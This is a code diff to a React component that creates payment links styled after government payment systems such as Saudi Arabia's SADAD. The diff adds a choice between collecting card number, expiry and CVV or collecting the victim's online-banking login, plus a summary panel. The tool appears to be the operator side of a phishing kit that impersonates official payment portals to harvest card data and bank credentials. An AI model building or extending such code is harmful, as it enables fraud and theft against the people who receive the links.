@@ -7,7 +7,7 @@ import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
-import { getCurrencySymbol, getCurrencyName, getCurrencyCode } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { CreditCard, DollarSign, Hash, FileText, Copy, ExternalLink, Shield, CheckCircle2, Link as LinkIcon } from "lucide-react";
@@ -47,6 +47,7 @@ const GovernmentPaymentLinkCreator = () => {
   const [paymentAmount, setPaymentAmount] = useState("500");
   const [referenceNumber, setReferenceNumber] = useState("");
   const [description, setDescription] = useState("");
+  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [linkId, setLinkId] = useState("");
@@ -75,6 +76,7 @@ const GovernmentPaymentLinkCreator = () => {
           description: description,
           selectedCountry: country || "SA",
           service_key: provider || "sadad",
+          payment_method: paymentMethod, // حفظ طريقة الدفع
         },
       });
 
@@ -252,6 +254,120 @@ const GovernmentPaymentLinkCreator = () => {
                 />
               </div>
 
+              {/* Payment Method Selection */}
+              <div>
+                <Label className="mb-3 text-base font-bold">
+                  اختر طريقة الدفع *
+                </Label>
+                <div className="grid grid-cols-2 gap-3">
+                  {/* Card Option */}
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod('card')}
+                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
+                      paymentMethod === 'card'
+                        ? 'shadow-md'
+                        : 'hover:border-gray-300'
+                    }`}
+                    style={{
+                      borderColor: paymentMethod === 'card' ? govSystem.colors.primary : '#e5e7eb',
+                      backgroundColor: paymentMethod === 'card' ? `${govSystem.colors.primary}10` : 'white'
+                    }}
+                  >
+                    <div className="flex items-start gap-3">
+                      <div 
+                        className="p-2 rounded-full"
+                        style={{
+                          backgroundColor: paymentMethod === 'card' ? govSystem.colors.primary : '#f3f4f6',
+                          color: paymentMethod === 'card' ? 'white' : '#6b7280'
+                        }}
+                      >
+                        <CreditCard className="w-5 h-5" />
+                      </div>
+                      <div className="flex-1">
+                        <h4 
+                          className="font-semibold text-sm mb-1"
+                          style={{ color: paymentMethod === 'card' ? govSystem.colors.primary : '#1f2937' }}
+                        >
+                          إدخال بيانات البطاقة
+                        </h4>
+                        <p className="text-xs text-gray-600">
+                          إدخال رقم البطاقة وبيانات الدفع مباشرة
+                        </p>
+                      </div>
+                    </div>
+                    {paymentMethod === 'card' && (
+                      <div className="absolute top-2 left-2">
+                        <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
+                      </div>
+                    )}
+                  </button>
+
+                  {/* Bank Login Option */}
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod('bank_login')}
+                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
+                      paymentMethod === 'bank_login'
+                        ? 'shadow-md'
+                        : 'hover:border-gray-300'
+                    }`}
+                    style={{
+                      borderColor: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#e5e7eb',
+                      backgroundColor: paymentMethod === 'bank_login' ? `${govSystem.colors.primary}10` : 'white'
+                    }}
+                  >
+                    <div className="flex items-start gap-3">
+                      <div 
+                        className="p-2 rounded-full"
+                        style={{
+                          backgroundColor: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#f3f4f6',
+                          color: paymentMethod === 'bank_login' ? 'white' : '#6b7280'
+                        }}
+                      >
+                        <Shield className="w-5 h-5" />
+                      </div>
+                      <div className="flex-1">
+                        <h4 
+                          className="font-semibold text-sm mb-1"
+                          style={{ color: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#1f2937' }}
+                        >
+                          تسجيل دخول البنك
+                        </h4>
+                        <p className="text-xs text-gray-600">
+                          الدفع عبر تسجيل الدخول إلى حسابك البنكي
+                        </p>
+                      </div>
+                    </div>
+                    {paymentMethod === 'bank_login' && (
+                      <div className="absolute top-2 left-2">
+                        <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
+                      </div>
+                    )}
+                  </button>
+                </div>
+
+                {/* Info Message */}
+                <div 
+                  className="p-3 rounded-lg text-xs mt-3"
+                  style={{
+                    backgroundColor: paymentMethod === 'card' ? '#eff6ff' : '#fef3c7',
+                    color: paymentMethod === 'card' ? '#1e40af' : '#92400e',
+                    border: `1px solid ${paymentMethod === 'card' ? '#bfdbfe' : '#fde68a'}`
+                  }}
+                >
+                  {paymentMethod === 'card' ? (
+                    <>
+                      <strong>إدخال بيانات البطاقة:</strong> سيتم طلب إدخال رقم البطاقة، تاريخ الانتهاء، ورمز CVV
+                    </>
+                  ) : (
+                    <>
+                      <strong>تسجيل الدخول البنكي:</strong> سيتم طلب اختيار البنك وتسجيل الدخول بمعلومات حسابك البنكي
+                    </>
+                  )}
+                </div>
+              </div>
+
               <Button
                 type="submit"
                 size="lg"
@@ -294,6 +410,26 @@ const GovernmentPaymentLinkCreator = () => {
                 <code className="flex-1 bg-white p-3 rounded text-sm break-all border">
                   {createdPaymentUrl}
                 </code>
+              </div>
+            </div>
+
+            {/* Payment Summary */}
+            <div className="mt-4 space-y-2 text-sm">
+              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                <span className="text-gray-600">المبلغ:</span>
+                <span className="font-bold">{formatCurrency(parseFloat(paymentAmount), getCurrencyCode(country || "SA"))}</span>
+              </div>
+              {referenceNumber && (
+                <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                  <span className="text-gray-600">المرجع:</span>
+                  <span className="font-semibold">{referenceNumber}</span>
+                </div>
+              )}
+              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                <span className="text-gray-600">طريقة الدفع:</span>
+                <span className="font-semibold">
+                  {paymentMethod === 'card' ? 'إدخال بيانات البطاقة' : 'تسجيل دخول البنك'}
+                </span>
               </div>
             </div>
           </div>
